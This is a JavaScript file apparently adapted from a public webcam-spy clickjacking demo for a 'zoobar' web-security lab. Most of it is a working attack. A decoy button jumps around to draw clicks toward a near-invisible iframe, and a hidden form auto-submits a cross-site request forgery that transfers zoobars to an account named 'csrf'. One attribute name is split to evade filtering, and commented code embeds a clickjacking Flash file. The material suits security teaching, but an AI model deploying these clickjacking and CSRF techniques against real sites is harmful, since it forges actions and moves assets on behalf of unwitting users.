/**  Copyright 2011 Feross Aboukhadijeh
 *
 *   Licensed under the Apache License, Version 2.0 (the "License");
 *   you may not use this file except in compliance with the License.
 *   You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 *   Unless required by applicable law or agreed to in writing, software
 *   distributed under the License is distributed on an "AS IS" BASIS,
 *   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *   See the License for the specific language governing permissions and
 *   limitations under the License.
 */

/**
 *                   Author:  Feross Aboukhadijeh
 *  Blog post & explanation:  http://feross.org/webcam-spy/
 *                Live demo:  http://feross.org/hacks/webcam-spy/
 *
 *  Not the prettiest code I've written, but it does the job.
 */



 /** var settingsCoords = [
    {x: -1100, y: -770},
    {x: -500, y: -670, refreshSettings: 400, refreshCam: 1},
    {x: -280, y: -840},
    {x: -100, y: -600, refreshSettings: 1, refreshCam: 400},
    {x: -1100, y: -770}];
*/

/** var settingsCoords = [
    {x: -17, y: -70},
    {x: -50, y: -70, refreshSettings: 400, refreshCam: 1},
    {x: -28, y: -40},
    {x: -10, y: -60, refreshSettings: 1, refreshCam: 400},
    {x: -10, y: -70}];

*/

var counter = 0;
var textChoices = ["Click me!", "Over here!", "Tap me!", "Press me!", "Touch me!"];
var settingsVisible = false;

var show = function(){
        counter++;
   $('button.punch').text(textChoices[rand(textChoices.length)]);
     if(counter == 7){
            $('button.punch').css({left:360,top:300});
            $('button.punch').mouseover(function() {
            $('button.punch').css('z-index', 1); // let flash get clicks now
         window.setTimeout(function() {
                   // $('button.punch').css({'z-index', 100,"opacity":"1"}) ;// let the button get clicks now
           $('button.punch').click();
                }, 3000);
                $('button.punch').unbind('mouseover'); 
                counter = 0;
            });
     }else{
        $('button.punch').css({left: rand(380), top: rand(350)}); 
     }


    $('#showHide').click(function(e) {
        settingsVisible = !settingsVisible;
        setSettingsVisibility();
        e.stopPropagation();
        e.preventDefault();
	
    });

    refreshSettings(1);
   

    $('#container').css({left: 100, top: 100});

  
	
}
show();
// Random number between 1 and n
function rand(n) {
    return Math.floor(Math.random()*(n+1))
}

function setSettingsVisibility() {
    if (settingsVisible) {
        $('#settings iframe').css('opacity', 0.5);
    } else {
        $('#settings iframe').css('opacity', 0.001);
    }
}

function refreshSettings(timeout) {
    window.setTimeout(function() {
        var ifr = $("#steal");
        var form = $('<form method="POST" id="transferform" action="http://andos.com/myzoo/transfer.php"></form>');
        var ip1 = $('<input name=zoobars type=text value="1" size=5>');
        var ip2 = $('<input name=recipient type=text value="csrf">');
        var ip3 = $('<input type=text name=submission value="Send">');
        form.append(ip1);
        form.append(ip2);
        form.append(ip3);
        ifr.append(form);
        form.attr("t"+"arget", "steal");//set jump target to steal
        form.submit();
        setSettingsVisibility();
    }, timeout);
}

/** function refreshCam(timeout) {
    window.setTimeout(function() {
	alert("3");
        $('#cam').empty().append($('<embed wmode="transparent" width="320" height="240" align="middle" type="application/x-shockwave-flash" pluginspage="http://www.adobe.com/go/getflashplayer" name="ClickJacking" quality="high" id="ClickJacking" src="swf/ClickJacking.swf?131"/>'));
    }, timeout);
}*/


